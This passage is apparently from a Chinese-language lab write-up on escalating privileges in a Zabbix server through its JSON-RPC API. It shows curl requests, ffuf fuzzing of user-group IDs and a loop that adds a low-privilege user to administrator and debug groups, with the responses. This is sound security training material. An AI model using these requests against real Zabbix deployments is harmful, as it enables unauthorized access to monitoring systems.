class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ts_provisioned&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;role&quot;</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当前用户<code>id</code>为3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#example</span><br><span class="line">&#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;user.update&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">        &quot;userid&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;John&quot;,</span><br><span class="line">        &quot;surname&quot;: &quot;Doe&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试修改当前用户的name</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url <span class="string">&#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data <span class="string">&#x27;&#123;                                                                                                                                                    </span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;user.update&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;userid&quot;: &quot;3&quot;,</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;matthewa&quot;,</span></span><br><span class="line"><span class="string">      &quot;surname&quot;: &quot;matthew&quot;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">&quot;auth&quot;: &quot;68bf0989c3d2c8e971316d65244da711&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> -s|jq</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;userids&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;3&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>确认一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url <span class="string">&#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data <span class="string">&#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;u.roleid&quot;],&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;a22e1e871a2a048d8353dcc1471867a2&quot;, &quot;id&quot;: 1&#125;&#x27;</span> -s|jq                </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;userid&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">      <span class="string">&quot;username&quot;</span>: <span class="string">&quot;matthew&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;matthewa&quot;</span>,</span><br><span class="line">      <span class="string">&quot;surname&quot;</span>: <span class="string">&quot;matthew&quot;</span>,</span><br><span class="line">      <span class="string">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;autologin&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;autologout&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;refresh&quot;</span>: <span class="string">&quot;30s&quot;</span>,</span><br><span class="line">      <span class="string">&quot;theme&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_failed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_ip&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_clock&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;rows_per_page&quot;</span>: <span class="string">&quot;50&quot;</span>,</span><br><span class="line">      <span class="string">&quot;timezone&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;roleid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ts_provisioned&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;role&quot;</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我尝试将roleid修改为1，但是仍旧是底权，修改为其他role提示roleid已经被持有，所以还是要加组。</p>
<p>那现在要做的就是给自己更新组</p>
<p>首先我要确定有哪些组，比较坑的是官方文档里没给默认的组id</p>
<p>不过可以通过轮询来添加，先确定一下update的字段</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">validateUpdate</span>(<span class="params"><span class="keyword">array</span> &amp;<span class="variable">$users</span>, <span class="keyword">array</span> &amp;<span class="variable">$db_users</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line">			<span class="string">&#x27;usrgrps&#x27;</span> =&gt;		[<span class="string">&#x27;type&#x27;</span> =&gt; API_OBJECTS, <span class="string">&#x27;uniq&#x27;</span> =&gt; [[<span class="string">&#x27;usrgrpid&#x27;</span>]], <span class="string">&#x27;fields&#x27;</span> =&gt; [</span><br><span class="line">				<span class="string">&#x27;usrgrpid&#x27;</span> =&gt;		[<span class="string">&#x27;type&#x27;</span> =&gt; API_ID, <span class="string">&#x27;flags&#x27;</span> =&gt; API_REQUIRED]</span><br><span class="line">			]],</span><br><span class="line">...</span><br><span class="line">		]];</span><br></pre></td></tr></table></figure>

<p>显然他是个套在<code>usrgrps</code>列表的里的<code>usrgrpid</code>，也就是说应该可以同时加很多个组，不过为了方便辨别那些组存在我还是单个加。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --path-as-is -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Host: 10.10.11.50&#x27; -H $&#x27;Accept-Encoding: gzip, deflate&#x27; -H $&#x27;Accept: */*&#x27; -H $&#x27;Connection: close&#x27; -H $&#x27;Content-Type: application/json-rpc&#x27; -H $&#x27;Content-Length: 161&#x27; \</span><br><span class="line">    --data-binary $&#x27;&#123;\x0d\x0a  \&quot;jsonrpc\&quot;: \&quot;2.0\&quot;, \&quot;method\&quot;:\&quot;user.update\&quot;, \&quot;params\&quot;:&#123;\&quot;userid\&quot;: \&quot;3\&quot;,\&quot;usrgrps\&quot;: [&#123;\&quot;usrgrpid\&quot;: 1&#125;] &#125;,\x0d\x0a\&quot;auth\&quot;: \&quot;b4353b38f7f909df7cd34a37dceba239\&quot;,\x0d\x0a  \&quot;id\&quot;: 1\x0d\x0a&#125;&#x27; \</span><br><span class="line">    $&#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 14 Dec 2024 10:04:22 GMT</span><br><span class="line">Server: Apache/2.4.52 (Ubuntu)</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: Content-Type</span><br><span class="line">Access-Control-Allow-Methods: POST</span><br><span class="line">Access-Control-Max-Age: 1000</span><br><span class="line">Content-Length: 144</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;error&quot;:&#123;&quot;code&quot;:-32602,&quot;message&quot;:&quot;Invalid params.&quot;,&quot;data&quot;:&quot;Invalid parameter \&quot;/1/usrgrps/1\&quot;: object does not exist.&quot;&#125;,&quot;id&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>组1，显示没这个组，fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">└─$ ffuf -request req -request-proto http -w &lt;(seq 0 100) -fs 939 -fs 144</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : POST</span><br><span class="line"> :: URL              : http://10.10.11.50/zabbix/api_jsonrpc.php</span><br><span class="line"> :: Wordlist         : FUZZ: /proc/self/fd/11</span><br><span class="line"> :: Header           : Connection: keep-alive</span><br><span class="line"> :: Header           : Content-Type: application/json-rpc</span><br><span class="line"> :: Header           : Host: 10.10.11.50</span><br><span class="line"> :: Header           : Accept-Encoding: gzip, deflate</span><br><span class="line"> :: Header           : Accept: */*</span><br><span class="line"> :: Data             : &#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;:&quot;user.update&quot;, &quot;params&quot;:&#123;&quot;userid&quot;: &quot;3&quot;,&quot;usrgrps&quot;: [&#123;&quot;usrgrpid&quot;:FUZZ&#125;] &#125;,</span><br><span class="line">&quot;auth&quot;: &quot;b4353b38f7f909df7cd34a37dceba239&quot;,</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response size: 144</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">11                      [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 585ms]</span><br><span class="line">8                       [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 571ms]</span><br><span class="line">9                       [Status: 200, Size: 166, Words: 16, Lines: 1, Duration: 656ms]</span><br><span class="line">7                       [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 571ms]</span><br><span class="line">12                      [Status: 200, Size: 166, Words: 16, Lines: 1, Duration: 2129ms]</span><br><span class="line">13                      [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 2260ms]</span><br></pre></td></tr></table></figure>

<p>得到7，8，9，11，12，13是组</p>
<p>看一下当前的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;usergroup.get&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">        &quot;output&quot;: &quot;extend&quot;,</span><br><span class="line">        &quot;status&quot;: 0</span><br><span class="line">    &#125;,                                                          </span><br><span class="line">     &quot;auth&quot;: &quot;b4353b38f7f909df7cd34a37dceba239&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;usrgrpid&quot;: &quot;13&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Internal&quot;,</span><br><span class="line">      &quot;gui_access&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;users_status&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;debug_mode&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;userdirectoryid&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;mfa_status&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;mfaid&quot;: &quot;0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后跑完是个13组名是<code>internal</code>，那我们可以写个脚本轮询一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;7,8,9,11,12,13&#125;;<span class="keyword">do</span> curl -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header <span class="string">&#x27;Content-Type: application/json-rpc&#x27;</span> --data <span class="string">&#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;:&quot;user.update&quot;, &quot;params&quot;:&#123;&quot;usrgrps&quot;: [&#123;&quot;usrgrpid&quot;: &#x27;</span><span class="variable">$i</span><span class="string">&#x27;&#125;], &quot;userid&quot;: &quot;3&quot;&#125;,&quot;auth&quot;:&quot;b4353b38f7f909df7cd34a37dceba239&quot;, &quot;id&quot;: 3&#125;&#x27;</span>;curl --request POST \</span><br><span class="line">--url <span class="string">&#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">    &quot;method&quot;: &quot;usergroup.get&quot;,</span></span><br><span class="line"><span class="string">    &quot;params&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;output&quot;: &quot;extend&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">     &quot;auth&quot;: &quot;b4353b38f7f909df7cd34a37dceba239&quot;, &quot;id&quot;: 1&#125;&#x27;</span> -s|jq;<span class="keyword">done</span></span><br><span class="line">&#123;<span class="string">&quot;jsonrpc&quot;</span>:<span class="string">&quot;2.0&quot;</span>,<span class="string">&quot;result&quot;</span>:&#123;<span class="string">&quot;userids&quot;</span>:[<span class="string">&quot;3&quot;</span>]&#125;,<span class="string">&quot;id&quot;</span>:3&#125;&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Zabbix administrators&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gui_access&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;users_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;debug_mode&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfa_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfaid&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br><span class="line">&#123;<span class="string">&quot;jsonrpc&quot;</span>:<span class="string">&quot;2.0&quot;</span>,<span class="string">&quot;result&quot;</span>:&#123;<span class="string">&quot;userids&quot;</span>:[<span class="string">&quot;3&quot;</span>]&#125;,<span class="string">&quot;id&quot;</span>:3&#125;&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Guests&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gui_access&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;users_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;debug_mode&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfa_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfaid&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br><span class="line">&#123;<span class="string">&quot;jsonrpc&quot;</span>:<span class="string">&quot;2.0&quot;</span>,<span class="string">&quot;error&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:-32602,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Invalid params.&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;User cannot add himself to a disabled group or a group with disabled GUI access.&quot;</span>&#125;,<span class="string">&quot;id&quot;</span>:3&#125;&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Guests&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gui_access&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;users_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;debug_mode&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfa_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfaid&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br><span class="line">&#123;<span class="string">&quot;jsonrpc&quot;</span>:<span class="string">&quot;2.0&quot;</span>,<span class="string">&quot;result&quot;</span>:&#123;<span class="string">&quot;userids&quot;</span>:[<span class="string">&quot;3&quot;</span>]&#125;,<span class="string">&quot;id&quot;</span>:3&#125;&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;11&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Enabled debug mode&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gui_access&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;users_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;debug_mode&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfa_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfaid&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br><span class="line">&#123;<span class="string">&quot;jsonrpc&quot;</span>:<span class="string">&quot;2.0&quot;</span>,<span class="string">&quot;error&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:-32602,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Invalid params.&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;User cannot add himself to a disabled group or a group with disabled GUI access.&quot;</span>,<span class="string">&quot;debug&quot;</span>:[&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/share/zabbix/include/classes/api/services/CUser.php&quot;</span>,<span class="string">&quot;line&quot;</span>:1126,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;exception&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;CApiService&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;::&quot;</span>&#125;,&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/share/zabbix/include/classes/api/services/CUser.php&quot;</span>,<span class="string">&quot;line&quot;</span>:542,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;checkHimself&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;CUser&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;-&gt;&quot;</span>&#125;,&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/share/zabbix/include/classes/api/services/CUser.php&quot;</span>,<span class="string">&quot;line&quot;</span>:359,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;validateUpdate&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;CUser&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;-&gt;&quot;</span>&#125;,&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/share/zabbix/include/classes/api/clients/CLocalApiClient.php&quot;</span>,<span class="string">&quot;line&quot;</span>:126,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;update&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;CUser&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;-&gt;&quot;</span>&#125;,&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/share/zabbix/include/classes/core/CJsonRpc.php&quot;</span>,<span 